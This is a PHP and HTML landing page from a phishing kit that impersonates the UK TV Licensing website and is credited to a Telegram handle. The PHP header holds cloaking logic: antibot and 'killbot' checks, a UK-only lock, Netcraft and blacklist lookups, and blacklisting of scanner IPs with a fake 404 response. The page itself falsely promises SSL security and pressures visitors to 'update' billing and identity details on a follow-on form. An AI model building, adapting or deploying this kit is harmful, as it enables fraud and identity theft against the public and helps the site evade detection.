<?php
// @Kr3pto on telegram
error_reporting(0);
session_start();
require "configg.php";
require "tvgb_assetz/sinc/functions.php";

 
if($internal_antibot == 1){
	require "tvgb_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "tvgb_assetz/mob_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
$rand = generateRandomString(130);
require "tvgb_assetz/sinc/visitor_log.php";
require "tvgb_assetz/sinc/netcraft_check.php";
require "tvgb_assetz/sinc/blacklist_lookup.php";
require "tvgb_assetz/sinc/ip_range_check.php";
//header("location:AboutTheTVLicenceHolder.php?sslchannel=true&sessionid=$rand");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="https://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Welcome to TV Licensing's Update Process - TV Licensing ™</title>
        <link rel="stylesheet" href="tvgb_assetz/css/master.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/jquery.ui.all.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/master_rwd.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/jquery.mobile-1.3.20.css" />
        <link rel="shortcut icon" href="tvgb_assetz/img/favicon.ico" />
    </head>
    <body class="steps">
        <div id="iPage">
            <div id="iHeader">
                <div class="innerContainer clearfix topHeadCtr" style="display: block;">
                    <div class="clearfix" id="headerTop">
                        <div class="clearfix" id="iLogo">
                            <h1>
                                <a href="javascript:void(0);" class="fwckembeddedlink logoWrapper"><img src="tvgb_assetz/img/imgHeaderLogo.png" /> </a> <span class="headingText">TV Licensing</span>
                            </h1>
                            <div id="linkToggle" style="cursor: pointer;">&nbsp;</div>
                        </div>
                        <div class="mobileNav clearfix right" id="iMobileNav"><div class="clearfix" id="srhCtr" style="cursor: pointer;">&nbsp;</div></div>
                        <div class="clearfix" id="iGlobalNav">
                            <ul>
                                <li class="first"><a href="javascript:void(0);" class="fwckembeddedlink">Home</a></li>
                                <li><a href="javascript:void(0);" class="fwckembeddedlink">Easy read</a></li>
                                <li class="second">
                                    <span lang="cy"><a href="javascript:void(0);" class="fwckembeddedlink">Cymraeg</a> </span>
                                </li>
                            </ul>
                            <fieldset class="search" id="siteSrch" style="display: block;">
                                <legend class="hide">search site</legend>
                                <span class="siteSearchWrap"> <input id="siteSearch" name="q" style="color: rgb(88, 88, 88);" type="search" value="Search" /> </span>
                                <input id="siteSearchGo" type="button" value="search" name="___##NO_NAMED_ELEMENT##___" />
                            </fieldset>
                        </div>
                    </div>
                    <div class="clearfix" id="iPrimaryNav">
                        <ul>
                            <li>
                                <a href="javascript:void(0);">
                                    <span><strong>Pay</strong> for your TV Licence</span>
                                </a>
                            </li>
                            <li>
                                <a href="javascript:void(0);">
                                    <span><strong>Update</strong> your details</span>
                                </a>
                            </li>
                            <li>
                                <a href="javascript:void(0);" class="fwckembeddedlink">
                                    <span><strong>Check</strong> if you need one</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
                <div>&nbsp;</div>
            </div>
            <div id="iContent">
                <div class="innerContainer" style="display: block;">
                    <ul id="iBread">
                        <li>
                            <a href="javascript:void(0);">Home</a>
                        </li>
                        
                        <li>/ Update</li>
                    </ul>
                    <div id="iPrimary" style="width:100%;">
                        
                        <div class="panel secondary stepContent clearfix" id="stepContent" style="width:100%;float:unset;">
                            <h2 class="header beta"><span>Welcome to TV Licensing's Update Process</span></h2>
							
                            <form action="#" id="payForm" method="post">
								<br>
								<p style="color:#004855;">
									<strong>All transmission are secured using 256 bit SSL layer.</strong>
								</p>
								<div style="padding-bottom:10px;"></div>
								<div style="border-top:0.077em solid #E1E8EA;padding-bottom:20px;"></div>
								<p class="intro">
									The process ahead will help you in updating your details to its latest form, which will enable your services again.<br>Please use the accurate information relating your residential and billing data, as it will be used to bill you, as well as, your identity will be verified against the same set of information.<br>
									<br>
									Click on "Update" below to start the process.
								</p>
								<div class="primaryLnkWrap">
									<a href="AboutTheTVLicenceHolder.php?sslchannel=true&sessionid=<?=generateRandomString(130);?>" class="primaryLnk payBtnRenew jButtonRedirect primaryBtnLnk">
										<span>Update<span>Initiate process now.</span></span>
									</a>
									<span class="divider"></span>
								</div>
								<br>
								<p class="help">*All the information provided must match with your official record to keep a track of your identity. Any errors will lead to termination of the service.</p>
                            </form>
                        </div>
                    </div>
                    <div style="clear: both;"></div>
                </div>
            </div>
            <div id="iFooter">
                <div class="innerContainer" style="display: block;">
                    <ul id="iFooterNav">
                        <li class="first"><a href="javascript:void(0);" class="fwckembeddedlink">About us</a></li>
                        <li><a href="javascript:void(0);">Contact us</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Accessibility</a></li>
                        <li><a href="javascript:void(0);">Community relations</a></li>
                        <li><a href="javascript:void(0);">Media Centre</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Sitemap</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Cookies</a></li>
                        <li class="last"><a href="javascript:void(0);" class="fwckembeddedlink">Privacy policy</a></li>
                    </ul>
                    <p>General information about TV Licensing is available in other languages:</p>
                    <ul id="iLanguages">
                        <li class="first">
                            <span lang="cy"><a href="javascript:void(0);" class="fwckembeddedlink">Cymraeg</a></span>
                        </li>
                        <li>
                            <span lang="pl"><a href="javascript:void(0);" class="fwckembeddedlink">Polski</a></span>
                        </li>
                        <li>
                            <span lang="es"><a href="javascript:void(0);" class="fwckembeddedlink">Español</a></span>
                        </li>
                        <li>
                            <span lang="pt"><a href="javascript:void(0);" class="fwckembeddedlink">Português</a></span>
                        </li>
                        <li style="background: rgba(0, 0, 0, 0) url('tvgb_assetz/img/imgFooterNavBg.png') no-repeat scroll right top; padding-right: 1.4em;">
                            <span class="unicode" lang="ur"> <a href="javascript:void(0);" class="fwckembeddedlink">اردو</a> </span>
                        </li>
                        <li class="last" style="padding-left: 1.11em;"><a href="javascript:void(0);">More languages &gt;&gt;</a></li>
                    </ul>
                    <p class="copyright">© 2025 TV Licensing</p>
                </div>
            </div>
        </div>
    </body>
</html>